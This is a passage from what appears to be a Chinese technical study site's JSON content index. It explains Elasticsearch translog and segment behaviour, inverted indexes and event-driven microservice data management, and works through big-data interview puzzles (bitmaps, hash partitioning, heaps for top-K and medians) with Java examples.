过大，也会触发 flush 。flush 操作就对应着 commit 的全过程，我们可以通过 es api，手动执行 flush 操作，手动将 os cache 中的数据 fsync 强刷到磁盘上去。\ntranslog 日志文件的作用是什么？你执行 commit 操作之前，数据要么是停留在 buffer 中，要么是停留在 os cache 中，无论是 buffer 还是 os cache 都是内存，一旦这台机器死了，内存中的数据就全丢了。所以需要将数据对应的操作写入一个专门的日志文件 translog 中，一旦此时机器宕机，再次重启的时候，es 会自动读取 translog 日志文件中的数据，恢复到内存 buffer 和 os cache 中去。\ntranslog 其实也是先写入 os cache 的，默认每隔 5 秒刷一次到磁盘中去，所以默认情况下，可能有 5 秒的数据会仅仅停留在 buffer 或者 translog 文件的 os cache 中，如果此时机器挂了，会丢失 5 秒钟的数据。但是这样性能比较好，最多丢 5 秒的数据。也可以将 translog 设置成每次写操作必须是直接 fsync 到磁盘，但是性能会差很多。\n index.translog.sync_interval 控制 translog 多久 fsync 到磁盘,最小为 100ms； index.translog.durability translog 是每 5 秒钟刷新一次还是每次请求都 fsync，这个参数有 2 个取值：request(每次请求都执行 fsync,es 要等 translog fsync 到磁盘后才会返回成功)和 async(默认值，translog 每隔 5 秒钟 fsync 一次)。  实际上你在这里，如果面试官没有问你 es 丢数据的问题，你可以在这里给面试官炫一把，你说，其实 es 第一是准实时的，数据写入 1 秒后可以搜索到；可能会丢失数据的。有 5 秒的数据，停留在 buffer、translog os cache、segment file os cache 中，而不在磁盘上，此时如果宕机，会导致 5 秒的数据丢失。\n总结一下，数据先写入内存 buffer，然后每隔 1s，将数据 refresh 到 os cache，到了 os cache 数据就能被搜索到（所以我们才说 es 从写入到能被搜索到，中间有 1s 的延迟）。每隔 5s，将数据写入 translog 文件（这样如果机器宕机，内存数据全没，最多会有 5s 的数据丢失），translog 大到一定程度，或者默认每隔 30mins，会触发 commit 操作，将缓冲区的数据都 flush 到 segment file 磁盘文件中。\n 数据写入 segment file 之后，同时就建立好了倒排索引。\n 删除/更新数据底层原理    如果是删除操作，commit 的时候会生成一个 .del 文件，里面将某个 doc 标识为 deleted 状态，那么搜索的时候根据 .del 文件就知道这个 doc 是否被删除了。\n如果是更新操作，就是将原来的 doc 标识为 deleted 状态，然后新写入一条数据。\nbuffer 每 refresh 一次，就会产生一个 segment file ，所以默认情况下是 1 秒钟一个 segment file ，这样下来 segment file 会越来越多，此时会定期执行 merge。每次 merge 的时候，会将多个 segment file 合并成一个，同时这里会将标识为 deleted 的 doc 给物理删除掉，然后将新的 segment file 写入磁盘，这里会写一个 commit point ，标识所有新的 segment file ，然后打开 segment file 供搜索使用，同时删除旧的 segment file 。\n底层 lucene    简单来说，lucene 就是一个 jar 包，里面包含了封装好的各种建立倒排索引的算法代码。我们用 Java 开发的时候，引入 lucene jar，然后基于 lucene 的 api 去开发就可以了。\n通过 lucene，我们可以将已有的数据建立索引，lucene 会在本地磁盘上面，给我们组织索引的数据结构。\n倒排索引    在搜索引擎中，每个文档都有一个对应的文档 ID，文档内容被表示为一系列关键词的集合。例如，文档 1 经过分词，提取了 20 个关键词，每个关键词都会记录它在文档中出现的次数和出现位置。\n那么，倒排索引就是关键词到文档 ID 的映射，每个关键词都对应着一系列的文件，这些文件中都出现了关键词。\n举个栗子。\n有以下文档：\n   DocId Doc     1 谷歌地图之父跳槽 Facebook   2 谷歌地图之父加盟 Facebook   3 谷歌地图创始人拉斯离开谷歌加盟 Facebook   4 谷歌地图之父跳槽 Facebook 与 Wave 项目取消有关   5 谷歌地图之父拉斯加盟社交网站 Facebook    对文档进行分词之后，得到以下倒排索引。\n   WordId Word DocIds     1 谷歌 1, 2, 3, 4, 5   2 地图 1, 2, 3, 4, 5   3 之父 1, 2, 4, 5   4 跳槽 1, 4   5 Facebook 1, 2, 3, 4, 5   6 加盟 2, 3, 5   7 创始人 3   8 拉斯 3, 5   9 离开 3   10 与 4   .. .. ..    另外，实用的倒排索引还可以记录更多的信息，比如文档频率信息，表示在文档集合中有多少个文档包含某个单词。\n那么，有了倒排索引，搜索引擎可以很方便地响应用户的查询。比如用户输入查询 Facebook ，搜索系统查找倒排索引，从中读出包含这个单词的文档，这些文档就是提供给用户的搜索结果。\n要注意倒排索引的两个重要细节：\n 倒排索引中的所有词项对应一个或多个文档； 倒排索引中的词项根据字典顺序升序排列   上面只是一个简单的栗子，并没有严格按照字典顺序升序排列。\n "},{"id":171,"href":"/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1/event-driven-data-management-for-microservices/","title":"event-driven-data-management-for-microservices","parent":"微软服务","content":"1.1 微服务和分布式数据管理问题    单体式应用一般都会有一个关系型数据库，由此带来的好处是应用可以使用 ACID transactions，可以带来一些重要的操作特性：\n 原子性 – 任何改变都是原子性的 一致性 – 数据库状态一直是一致性的 隔离性 – 即使交易并发执行，看起来也是串行的 Durable – 一旦交易提交了就不可回滚  鉴于以上特性，应用可以简化为：开始一个交易，改变（插入，删除，更新）很多行，然后提交这些交易。\n使用关系型数据库带来另外一个优势在于提供 SQL（功能强大，可声明的，表转化的查询语言）支持。用户可以非常容易通过查询将多个表的数据组合起来，RDBMS 查询调度器决定最佳实现方式，用户不需要担心例如如何访问数据库等底层问题。另外，因为所有应用的数据都在一个数据库中，很容易去查询。\n然而，对于微服务架构来说，数据访问变得非常复杂，这是因为数据都是微服务私有的，唯一可访问的方式就是通过 API。这种打包数据访问方式使得微服务之间松耦合，并且彼此之间独立。如果多个服务访问同一个数据，schema 会更新访问时间，并在所有服务之间进行协调。\n更甚于，不同的微服务经常使用不同的数据库。应用会产生各种不同数据，关系型数据库并不一定是最佳选择。某些场景，某个 NoSQL 数据库可能提供更方便的数据模型，提供更加的性能和可扩展性。例如，某个产生和查询字符串的应用采用例如 Elasticsearch 的字符搜索引擎。同样的，某个产生社交图片数据的应用可以采用图片数据库，例如，Neo4j ；因此，基于微服务的应用一般都使用 SQL 和 NoSQL 结合的数据库，也就是被称为 polyglot persistence 的方法。\n分区的，polyglot-persistent 架构用于存储数据有许多优势，包括松耦合服务和更佳性能和可扩展性。然而，随之而来的则是分布式数据管理带来的挑战。\n第一个挑战在于如何完成一笔交易的同时保持多个服务之间数据一致性。之所以会有这个问题，我们以一个在线 B2B 商店为例，客户服务维护包括客户的各种信息，例如 credit lines 。订单服务管理订单，需要验证某个新订单与客户的信用限制没有冲突。在单一式应用中，订单服务只需要使用 ACID 交易就可以检查可用信用和创建订单。\n相反的，微服务架构下，订单和客户表分别是相对应服务的私有表，如下图所示：\n订单服务不能直接访问客户表，只能通过客户服务发布的 API 来访问。订单服务也可以使用 distributed transactions, 也就是周知的两阶段提交 (2PC)。然而，2PC 在现在应用中不是可选性。根据 CAP 理论，必须在可用性（availability）和 ACID 一致性（consistency）之间做出选择，availability 一般是更好的选择。但是，许多现代科技，例如许多 NoSQL 数据库，并不支持 2PC。在服务和数据库之间维护数据一致性是非常根本的需求，因此我们需要找其他的方案。\n第二个挑战是如何完成从多个服务中搜索数据。例如，设想应用需要显示客户和他的订单。如果订单服务提供 API 来接受用户订单信息，那么用户可以使用类应用型的 join 操作接收数据。应用从用户服务接受用户信息，从订单服务接受此用户订单。假设，订单服务只支持通过私有键（key）来查询订单（也许是在使用只支持基于主键接受的 NoSQL 数据库），此时，没有合适的方法来接收所需数据。\n1.2 事件驱动架构    对许多应用来说，这个解决方案就是使用事件驱动架构（event-driven architecture）。在这种架构中，当某件重要事情发生时，微服务会发布一个事件，例如更新一个业务实体。当订阅这些事件的微服务接收此事件时，就可以更新自己的业务实体，也可能会引发更多的时间发布。\n可以使用事件来实现跨多服务的业务交易。交易一般由一系列步骤构成，每一步骤都由一个更新业务实体的微服务和发布激活下一步骤的事件构成。下图展现如何使用事件驱动方法，在创建订单时检查信用可用度，微服务通过消息代理（Messsage Broker）来交换事件。\n 订单服务创建一个带有 NEW 状态的 Order （订单），发布了一个 “Order Created Event（创建订单）” 的事件。  客户服务消费 Order Created Event 事件，为此订单预留信用，发布 “Credit Reserved Event（信用预留）” 事件。  订单服务消费 Credit Reserved Event ，改变订单的状态为 OPEN。  更复杂的场景可以引入更多步骤，例如在检查用户信用的同时预留库存等。\n考虑到（a）每个服务原子性更新数据库和发布事件，然后，（b）消息代理确保事件传递至少一次，然后可以跨多个服务完成业务交易（此交易不是 ACID 交易）。这种模式提供弱确定性，例如最终一致性 eventual consistency。这种交易类型被称作 BASE model。\n亦可以使用事件来维护不同微服务拥有数据预连接（pre-join）的实现视图。维护此视图的服务订阅相关事件并且更新视图。例如，客户订单视图更新服务（维护客户订单视图）会订阅由客户服务和订单服务发布的事件。\n当客户订单视图更新服务收到客户或者订单事件，就会更新 客户订单视图数据集。可以使用文档数据库（例如 MongoDB）来实现客户订单视图，为每个用户存储一个文档。客户订单视图查询服务负责响应对客户以及最近订单（通过查询客户订单视图数据集）的查询。\n事件驱动架构也是既有优点也有缺点，此架构可以使得交易跨多个服务且提供最终一致性，并且可以使应用维护最终视图；而缺点在于编程模式比 ACID 交易模式更加复杂：为了从应用层级失效中恢复，还需要完成补偿性交易，例如，如果信用检查不成功则必须取消订单；另外，应用必须应对不一致的数据，这是因为临时（in-flight）交易造成的改变是可见的，另外当应用读取未更新的最终视图时也会遇见数据不一致问题。另外一个缺点在于订阅者必须检测和忽略冗余事件。\n1.3 原子操作 Achieving Atomicity    事件驱动架构还会碰到数据库更新和发布事件原子性问题。例如，订单服务必须向 ORDER 表插入一行，然后发布 Order Created event，这两个操作需要原子性。如果更新数据库后，服务瘫了（crashes）造成事件未能发布，系统变成不一致状态。确保原子操作的标准方式是使用一个分布式交易，其中包括数据库和消息代理。然而，基于以上描述的 CAP 理论，这却并不是我们想要的。\n1.3.1 使用本地交易发布事件    获得原子性的一个方法是对发布事件应用采用 multi-step process involving only local transactions，技巧在于一个 EVENT 表，此表在存储业务实体数据库中起到消息列表功能。应用发起一个（本地）数据库交易，更新业务实体状态，向 EVENT 表中插入一个事件，然后提交此次交易。另外一个独立应用进程或者线程查询此 EVENT 表，向消息代理发布事件，然后使用本地交易标志此事件为已发布，如下图所示：\n订单服务向 ORDER 表插入一行，然后向 EVENT 表中插入 Order Created event，事件发布线程或者进程查询 EVENT 表，请求未发布事件，发布他们，然后更新 EVENT 表标志此事件为已发布。\n此方法也是优缺点都有。优点是可以确保事件发布不依赖于 2PC，应用发布业务层级事件而不需要推断他们发生了什么；而缺点在于此方法由于开发人员必须牢记发布事件，因此有可能出现错误。另外此方法对于某些使用 NoSQL 数据库的应用是个挑战，因为 NoSQL 本身交易和查询能力有限。\n此方法因为应用采用了本地交易更新状态和发布事件而不需要 2PC，现在再看看另外一种应用简单更新状态获得原子性的方法。\n1.3.2 挖掘数据库交易日志    另外一种不需要 2PC 而获得线程或者进程发布事件原子性的方式就是挖掘数据库交易或者提交日志。应用更新数据库，在数据库交易日志中产生变化，交易日志挖掘进程或者线程读这些交易日志，将日志发布给消息代理。如下图所见：\n此方法的例子如 LinkedIn Databus 项目，Databus 挖掘 Oracle 交易日志，根据变化发布事件，LinkedIn 使用 Databus 来保证系统内各记录之间的一致性。\n另外的例子如：AWS 的 streams mechanism in AWS DynamoDB，是一个可管理的 NoSQL 数据库，一个 DynamoDB 流是由过去 24 小时对数据库表基于时序的变化（创建，更新和删除操作），应用可以从流中读取这些变化，然后以事件方式发布这些变化。\n交易日志挖掘也是优缺点并存。优点是确保每次更新发布事件不依赖于 2PC。交易日志挖掘可以通过将发布事件和应用业务逻辑分离开得到简化；而主要缺点在于交易日志对不同数据库有不同格式，甚至不同数据库版本也有不同格式；而且很难从底层交易日志更新记录转换为高层业务事件。\n交易日志挖掘方法通过应用直接更新数据库而不需要 2PC 介入。下面我们再看一种完全不同的方法：不需要更新只依赖事件的方法。\n1.3.3 使用事件源    Event sourcing （事件源）通过使用根本不同的事件中心方式来获得不需 2PC 的原子性，保证业务实体的一致性。 这种应用保存业务实体一系列状态改变事件，而不是存储实体现在的状态。应用可以通过重放事件来重建实体现在状态。只要业务实体发生变化，新事件就会添加到时间表中。因为保存事件是单一操作，因此肯定是原子性的。\n为了理解事件源工作方式，考虑事件实体作为一个例子。传统方式中，每个订单映射为 ORDER 表中一行，例如在 ORDER_LINE_ITEM 表中。但是对于事件源方式，订单服务以事件状态改变方式存储一个订单：创建的，已批准的，已发货的，取消的；每个事件包括足够数据来重建订单状态。\n事件是长期保存在事件数据库中，提供 API 添加和获取实体事件。事件存储跟之前描述的消息代理类似，提供 API 来订阅事件。事件存储将事件递送到所有感兴趣的订阅者，事件存储是事件驱动微服务架构的基干。\n事件源方法有很多优点：解决了事件驱动架构关键问题，使得只要有状态变化就可以可靠地发布事件，也就解决了微服务架构中数据一致性问题。另外，因为是持久化事件而不是对象，也就避免了 object relational impedance mismatch problem。\n数据源方法提供了 100%可靠的业务实体变化监控日志，使得获取任何时点实体状态成为可能。另外，事件源方法可以使得业务逻辑可以由事件交换的松耦合业务实体构成。这些优势使得单体应用移植到微服务架构变的相对容易。\n事件源方法也有不少缺点，因为采用不同或者不太熟悉的变成模式，使得重新学习不太容易；事件存储只支持主键查询业务实体，必须使用 Command Query Responsibility Segregation (CQRS) 来完成查询业务，因此，应用必须处理最终一致数据。\n1.4 总结    在微服务架构中，每个微服务都有自己私有的数据集。不同微服务可能使用不同的 SQL 或者 NoSQL 数据库。尽管数据库架构有很强的优势，但是也面对数据分布式管理的挑战。第一个挑战就是如何在多服务之间维护业务交易一致性；第二个挑战是如何从多服务环境中获取一致性数据。\n最佳解决办法是采用事件驱动架构。其中碰到的一个挑战是如何原子性的更新状态和发布事件。有几种方法可以解决此问题，包括将数据库视为消息队列、交易日志挖掘和事件源。\n"},{"id":172,"href":"/%E5%A4%A7%E6%95%B0%E6%8D%AE/find-a-number-if-exists/","title":"find-a-number-if-exists","parent":"大数据","content":"如何在大量的数据中判断一个数是否存在？    题目描述    给定 40 亿个不重复的没排过序的 unsigned int 型整数，然后再给定一个数，如何快速判断这个数是否在这 40 亿个整数当中？\n解答思路    方法一：分治法    依然可以用分治法解决，方法与前面类似，就不再次赘述了。\n方法二：位图法    由于 unsigned int 数字的范围是 [0, 1 \u0026lt;\u0026lt; 32)，我们用 1\u0026lt;\u0026lt;32=4,294,967,296 个 bit 来表示每个数字。初始位均为 0，那么总共需要内存：4,294,967,296b≈512M。\n我们读取这 40 亿个整数，将对应的 bit 设置为 1。接着读取要查询的数，查看相应位是否为 1，如果为 1 表示存在，如果为 0 表示不存在。\n方法总结    判断数字是否存在、判断数字是否重复的问题，位图法是一种非常高效的方法。\n"},{"id":173,"href":"/%E5%A4%A7%E6%95%B0%E6%8D%AE/find-common-urls/","title":"find-common-urls","parent":"大数据","content":"如何从大量的 URL 中找出相同的 URL？    题目描述    给定 a、b 两个文件，各存放 50 亿个 URL，每个 URL 各占 64B，内存限制是 4G。请找出 a、b 两个文件共同的 URL。\n解答思路    1. 分治策略    每个 URL 占 64B，那么 50 亿个 URL 占用的空间大小约为 320GB。\n 5, 000, 000, 000 _ 64B ≈ 5GB _ 64 = 320GB\n 由于内存大小只有 4G，因此，我们不可能一次性把所有 URL 加载到内存中处理。对于这种类型的题目，一般采用分治策略，即：把一个文件中的 URL 按照某个特征划分为多个小文件，使得每个小文件大小不超过 4G，这样就可以把这个小文件读到内存中进行处理了。\n思路如下：\n首先遍历文件 a，对遍历到的 URL 求 hash(URL) % 1000 ，根据计算结果把遍历到的 URL 存储到 a0, a1, a2, \u0026hellip;, a999，这样每个大小约为 300MB。使用同样的方法遍历文件 b，把文件 b 中的 URL 分别存储到文件 b0, b1, b2, \u0026hellip;, b999 中。这样处理过后，所有可能相同的 URL 都在对应的小文件中，即 a0 对应 b0, \u0026hellip;, a999 对应 b999，不对应的小文件不可能有相同的 URL。那么接下来，我们只需要求出这 1000 对小文件中相同的 URL 就好了。\n接着遍历 ai( i∈[0,999] )，把 URL 存储到一个 HashSet 集合中。然后遍历 bi 中每个 URL，看在 HashSet 集合中是否存在，若存在，说明这就是共同的 URL，可以把这个 URL 保存到一个单独的文件中。\n2. 前缀树    一般而言，URL 的长度差距不会不大，而且前面几个字符，绝大部分相同。这种情况下，非常适合使用字典树（trie tree） 这种数据结构来进行存储，降低存储成本的同时，提高查询效率。\n 由 @ChunelFeng 反馈。#212\n 方法总结    分治策略     分而治之，进行哈希取余； 对每个子文件进行 HashSet 统计。  前缀树     利用字符串的公共前缀来降低存储成本，提高查询效率。  "},{"id":174,"href":"/%E5%A4%A7%E6%95%B0%E6%8D%AE/find-hotest-query-string/","title":"find-hotest-query-string","parent":"大数据","content":"如何查询最热门的查询串？    题目描述    搜索引擎会通过日志文件把用户每次检索使用的所有查询串都记录下来，每个查询串的长度不超过 255 字节。\n假设目前有 1000w 个记录（这些查询串的重复度比较高，虽然总数是 1000w，但如果除去重复后，则不超过 300w 个）。请统计最热门的 10 个查询串，要求使用的内存不能超过 1G。（一个查询串的重复度越高，说明查询它的用户越多，也就越热门。）\n解答思路    每个查询串最长为 255B，1000w 个串需要占用 约 2.55G 内存，因此，我们无法将所有字符串全部读入到内存中处理。\n方法一：分治法    分治法依然是一个非常实用的方法。\n划分为多个小文件，保证单个小文件中的字符串能被直接加载到内存中处理，然后求出每个文件中出现次数最多的 10 个字符串；最后通过一个小顶堆统计出所有文件中出现最多的 10 个字符串。\n方法可行，但不是最好，下面介绍其他方法。\n方法二：HashMap 法    虽然字符串总数比较多，但去重后不超过 300w，因此，可以考虑把所有字符串及出现次数保存在一个 HashMap 中，所占用的空间为 300w*(255+4)≈777M（其中，4 表示整数占用的 4 个字节）。由此可见，1G 的内存空间完全够用。\n思路如下：\n首先，遍历字符串，若不在 map 中，直接存入 map，value 记为 1；若在 map 中，则把对应的 value 加 1，这一步时间复杂度 O(N) 。\n接着遍历 map，构建一个 10 个元素的小顶堆，若遍历到的字符串的出现次数大于堆顶字符串的出现次数，则进行替换，并将堆调整为小顶堆。\n遍历结束后，堆中 10 个字符串就是出现次数最多的字符串。这一步时间复杂度 O(Nlog10) 。\n方法三：前缀树法    方法二使用了 HashMap 来统计次数，当这些字符串有大量相同前缀时，可以考虑使用前缀树来统计字符串出现的次数，树的结点保存字符串出现次数，0 表示没有出现。\n思路如下：\n在遍历字符串时，在前缀树中查找，如果找到，则把结点中保存的字符串次数加 1，否则为这个字符串构建新结点，构建完成后把叶子结点中字符串的出现次数置为 1。\n最后依然使用小顶堆来对字符串的出现次数进行排序。\n方法总结    前缀树经常被用来统计字符串的出现次数。它的另外一个大的用途是字符串查找，判断是否有重复的字符串等。\n"},{"id":175,"href":"/%E5%A4%A7%E6%95%B0%E6%8D%AE/find-mid-value-in-500-millions/","title":"find-mid-value-in-500-millions","parent":"大数据","content":"如何从 5 亿个数中找出中位数？    题目描述    从 5 亿个数中找出中位数。数据排序后，位置在最中间的数就是中位数。当样本数为奇数时，中位数为 第 (N+1)/2 个数；当样本数为偶数时，中位数为 第 N/2 个数与第 1+N/2 个数的均值。\n解答思路    如果这道题没有内存大小限制，则可以把所有数读到内存中排序后找出中位数。但是最好的排序算法的时间复杂度都为 O(NlogN) 。这里使用其他方法。\n方法一：双堆法    维护两个堆，一个大顶堆，一个小顶堆。大顶堆中最大的数小于等于小顶堆中最小的数；保证这两个堆中的元素个数的差不超过 1。\n若数据总数为偶数，当这两个堆建好之后，中位数就是这两个堆顶元素的平均值。当数据总数为奇数时，根据两个堆的大小，中位数一定在数据多的堆的堆顶。\nclass MedianFinder { private PriorityQueue\u0026lt;Integer\u0026gt; maxHeap; private PriorityQueue\u0026lt;Integer\u0026gt; minHeap; /** initialize your data structure here. */ public MedianFinder() { maxHeap = new PriorityQueue\u0026lt;\u0026gt;(Comparator.reverseOrder()); minHeap = new PriorityQueue\u0026lt;\u0026gt;(Integer::compareTo); } public void addNum(int num) { if (maxHeap.isEmpty() || maxHeap.peek() \u0026gt; num) { maxHeap.offer(num); } else { minHeap.offer(num); } int size1 = maxHeap.size(); int size2 = minHeap.size(); if (size1 - size2 \u0026gt; 1) { minHeap.offer(maxHeap.poll()); } else if (size2 - size1 \u0026gt; 1) { maxHeap.offer(minHeap.poll()); } } public double findMedian() { int size1 = maxHeap.size(); int size2 = minHeap.size(); return size1 == size2 ? (maxHeap.peek() + minHeap.peek()) * 1.0 / 2 : (size1 \u0026gt; size2 ? maxHeap.peek() : minHeap.peek()); } }  见 LeetCode No.295：https://leetcode.com/problems/find-median-from-data-stream/\n 以上这种方法，需要把所有数据都加载到内存中。当数据量很大时，就不能这样了，因此，这种方法适用于数据量较小的情况。5 亿个数，每个数字占用 4B，总共需要 2G 内存。如果可用内存不足 2G，就不能使用这种方法了，下面介绍另一种方法。\n方法二：分治法    分治法的思想是把一个大的问题逐渐转换为规模较小的问题来求解。\n对于这道题，顺序读取这 5 亿个数字，对于读取到的数字 num，如果它对应的二进制中最高位为 1，则把这个数字写到 f1 中，否则写入 f0 中。通过这一步，可以把这 5 亿个数划分为两部分，而且 f0 中的数都大于 f1 中的数（最高位是符号位）。\n划分之后，可以非常容易地知道中位数是在 f0 还是 f1 中。假设 f1 中有 1 亿个数，那么中位数一定在 f0 中，且是在 f0 中，从小到大排列的第 1.5 亿个数与它后面的一个数的平均值。\n 提示，5 亿数的中位数是第 2.5 亿与右边相邻一个数求平均值。若 f1 有一亿个数，那么中位数就是 f0 中从第 1.5 亿个数开始的两个数求得的平均值。\n 对于 f0 可以用次高位的二进制继续将文件一分为二，如此划分下去，直到划分后的文件可以被加载到内存中，把数据加载到内存中以后直接排序，找出中位数。\n 注意，当数据总数为偶数，如果划分后两个文件中的数据有相同个数，那么中位数就是数据较小的文件中的最大值与数据较大的文件中的最小值的平均值。\n 方法总结    分治法，真香！\n"},{"id":176,"href":"/%E5%A4%A7%E6%95%B0%E6%8D%AE/find-no-repeat-number/","title":"find-no-repeat-number","parent":"大数据","content":"如何在大量的数据中找出不重复的整数？    题目描述    在 2.5 亿个整数中找出不重复的整数。注意：内存不足以容纳这 2.5 亿个整数。\n解答思路    方法一：分治法    与前面的题目方法类似，先将 2.5 亿个数划分到多个小文件，用 HashSet/HashMap 找出每个小文件中不重复的整数，再合并每个子结果，即为最终结果。\n方法二：位图法    位图，就是用一个或多个 bit 来标记某个元素对应的值，而键就是该元素。采用位作为单位来存储数据，可以大大节省存储空间。\n位图通过使用位数组来表示某些元素是否存在。它可以用于快速查找，判重，排序等。不是很清楚？我先举个小例子。\n假设我们要对 [0,7] 中的 5 个元素 (6, 4, 2, 1, 5) 进行排序，可以采用位图法。0~7 范围总共有 8 个数，只需要 8bit，即 1 个字节。首先将每个位都置 0：\n0 0 0 0 0 0 0 0 然后遍历 5 个元素，首先遇到 6，那么将下标为 6 的位的 0 置为 1；接着遇到 4，把下标为 4 的位 的 0 置为 1：\n0 0 0 0 1 0 1 0 依次遍历，结束后，位数组是这样的：\n0 1 1 0 1 1 1 0 每个为 1 的位，它的下标都表示了一个数：\nfor i in range(8): if bits[i] == 1: print(i) 这样我们其实就已经实现了排序。\n对于整数相关的算法的求解，位图法是一种非常实用的算法。假设 int 整数占用 4B，即 32bit，那么我们可以表示的整数的个数为 232。\n那么对于这道题，我们用 2 个 bit 来表示各个数字的状态：\n 00 表示这个数字没出现过； 01 表示这个数字出现过一次（即为题目所找的不重复整数）； 10 表示这个数字出现了多次。  那么这 232 个整数，总共所需内存为 232*2b=1GB。因此，当可用内存超过 1GB 时，可以采用位图法。假设内存满足位图法需求，进行下面的操作：\n遍历 2.5 亿个整数，查看位图中对应的位，如果是 00，则变为 01，如果是 01 则变为 10，如果是 10 则保持不变。遍历结束后，查看位图，把对应位是 01 的整数输出即可。\n当然，本题中特别说明：内存不足以容纳这 2.5 亿个整数，2.5 亿个整数的内存大小为：2.5e8/1024/1024/1024=0.93G，也即是说内存不足 1G，而位图法所需要的内存大小为 1G，因此，本题并不适合用位图法解决。\n方法总结    判断数字是否重复的问题，位图法是一种非常高效的方法，当然前提是：内存要满足位图法所需要的存储空间。\n"},{"id":177,"href":"/%E5%A4%A7%E6%95%B0%E6%8D%AE/find-rank-top-500-numbers/","title":"find-rank-top-500-numbers","parent":"大数据","content":"如何找出排名前 500 的数？    题目描述    有 20 个数组，每个数组有 500 个元素，并且有序排列。如何在这 20*500 个数中找出前 500 的数？\n解答思路    对于 TopK 问题，最常用的方法是使用堆排序。对本题而言，假设数组降序排列，可以采用以下方法：\n首先建立大顶堆，堆的大小为数组的个数，即为 20，把每个数组最大的值存到堆中。\n接着删除堆顶元素，保存到另一个大小为 500 的数组中，然后向大顶堆插入删除的元素所在数组的下一个元素。\n重复上面的步骤，直到删除完第 500 个元素，也即找出了最大的前 500 个数。\n 为了在堆中取出一个数据后，能知道它是从哪个数组中取出的，从而可以从这个数组中取下一个值，可以把数组的指针存放到堆中，对这个指针提供比较大小的方法。\n import lombok.Data; import java.util.Arrays; import java.util.PriorityQueue; /** * @author https://github.com/yanglbme */ @Data public class DataWithSource implements Comparable\u0026lt;DataWithSource\u0026gt; { /** * 数值 */ private int value; /** * 记录数值来源的数组 */ private int source; /** * 记录数值在数组中的索引 */ private int index; public DataWithSource(int value, int source, int index) { this.value = value; this.source = source; this.index = index; } /** * * 由于 PriorityQueue 使用小顶堆来实现，这里通过修改 * 两个整数的比较逻辑来让 PriorityQueue 变成大顶堆 */ @Override public int compareTo(DataWithSource o) { return Integer.compare(o.getValue(), this.value); } } class Test { public static int[] getTop(int[][] data) { int rowSize = data.length; int columnSize = data[0].length; // 创建一个columnSize大小的数组，存放结果  int[] result = new int[columnSize]; PriorityQueue\u0026lt;DataWithSource\u0026gt; maxHeap = new PriorityQueue\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; rowSize; ++i) { // 将每个数组的最大一个元素放入堆中  DataWithSource d = new DataWithSource(data[i][0], i, 0); maxHeap.add(d); } int num = 0; while (num \u0026lt; columnSize) { // 删除堆顶元素  DataWithSource d = maxHeap.poll(); result[num++] = d.getValue(); if (num \u0026gt;= columnSize) { break; } d.setValue(data[d.getSource()][d.getIndex() + 1]); d.setIndex(d.getIndex() + 1); maxHeap.add(d); } return result; } public static void main(String[] args) { int[][] data = { {29, 17, 14, 2, 1}, {19, 17, 16, 15, 6}, {30, 25, 20, 14, 5}, }; int[] top = getTop(data); System.out.println(Arrays.toString(top)); // [30, 29, 25, 20, 19]  } } 方法总结    求 TopK，不妨考虑一下堆排序？\n"},{"id":178,"href":"/%E5%A4%A7%E6%95%B0%E6%8D%AE/find-top-1-ip/","title":"find-top-1-ip","parent":"大数据","content":"如何找出某一天访问百度网站最多的 IP？    题目描述    现有海量日志数据保存在一个超大文件中，该文件无法直接读入内存，要求从中提取某天访问百度次数最多的那个 IP。\n解答思路    这道题只关心某一天访问百度最多的 IP，因此，可以首先对文件进行一次遍历，把这一天访问百度 IP 的相关信息记录到一个单独的大文件中。接下来采用的方法与上一题一样，大致就是先对 IP 进行哈希映射，接着使用 HashMap 统计重复 IP 的次数，最后计算出重复次数最多的 IP。\n 注：这里只需要找出出现次数最多的 IP，可以不必使用堆，直接用一个变量 max 即可。\n 方法总结     分而治之，进行哈希取余； 使用 HashMap 统计频数； 求解最大的 TopN 个，用小顶堆；求解最小的 TopN 个，用大顶堆。  "},{"id":179,"href":"/%E5%A4%A7%E6%95%B0%E6%8D%AE/find-top-100-words/","title":"find-top-100-words","parent":"大数据","content":"如何从大量数据中找出高频词？    题目描述    有一个 1GB 大小的文件，文件里每一行是一个词，每个词的大小不超过 16B，内存大小限制是 1MB，要求返回频数最高的 100 个词(Top 100)。\n解答思路    由于内存限制，我们依然无法直接将大文件的所有词一次读到内存中。因此，同样可以采用分治策略，把一个大文件分解成多个小文件，保证每个文件的大小小于 1MB，进而直接将单个小文件读取到内存中进行处理。\n思路如下：\n首先遍历大文件，对遍历到的每个词 x，执行 hash(x) % 5000 ，将结果为 i 的词存放到文件 ai 中。遍历结束后，我们可以得到 5000 个小文件。每个小文件的大小为 200KB 左右。如果有的小文件大小仍然超过 1MB，则采用同样的方式继续进行分解。\n接着统计每个小文件中出现频数最高的 100 个词。最简单的方式是使用 HashMap 来实现。其中 key 为词，value 为该词出现的频率。具体方法是：对于遍历到的词 x，如果在 map 中不存在，则执行 map.put(x, 1) ；若存在，则执行 map.put(x, map.get(x)+1) ，将该词频数加 1。\n上面我们统计了每个小文件单词出现的频数。接下来，我们可以通过维护一个小顶堆来找出所有词中出现频数最高的 100 个。具体方法是：依次遍历每个小文件，构建一个小顶堆，堆大小为 100。如果遍历到的词的出现次数大于堆顶词的出现次数，则用新词替换堆顶的词，然后重新调整为小顶堆，遍历结束后，小顶堆上的词就是出现频数最高的 100 个词。\n方法总结     分而治之，进行哈希取余； 使用 HashMap 统计频数； 求解最大的 TopN 个，用小顶堆；求解最小的 TopN 个，用大顶堆。  "},{"id":180,"href":"/tools/Git/","title":"Git","parent":"tools","content":" 版本控制  什么是版本控制 为什么要版本控制 本地版本控制系统 集中化的版本控制系统 分布式版本控制系统   认识 Git  Git 简史 Git 与其他版本管理系统的主要区别 Git 的三种状态   Git 使用快速入门  获取 Git 仓库 记录每次更新到仓库 一个好的 Git 提交消息 推送改动到远程仓库 远程仓库的移除与重命名 查看提交历史 撤销操作 分支   推荐阅读  版本控制    什么是版本控制    版本控制是一种记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统。 除了项目源代码，你可以对任何类型的文件进行版本控制。\n为什么要版本控制    有了它你就可以将某个文件回溯到之前的状态，甚至将整个项目都回退到过去某个时间点的状态，你可以比较文件的变化细节，查出最后是谁修改了哪个地方，从而找出导致怪异问题出现的原因，又是谁在何时报告了某个功能缺陷等等。\n本地版本控制系统    许多人习惯用复制整个项目目录的方式来保存不同的版本，或许还会改名加上备份时间以示区别。 这么做唯一的好处就是简单，但是特别容易犯错。 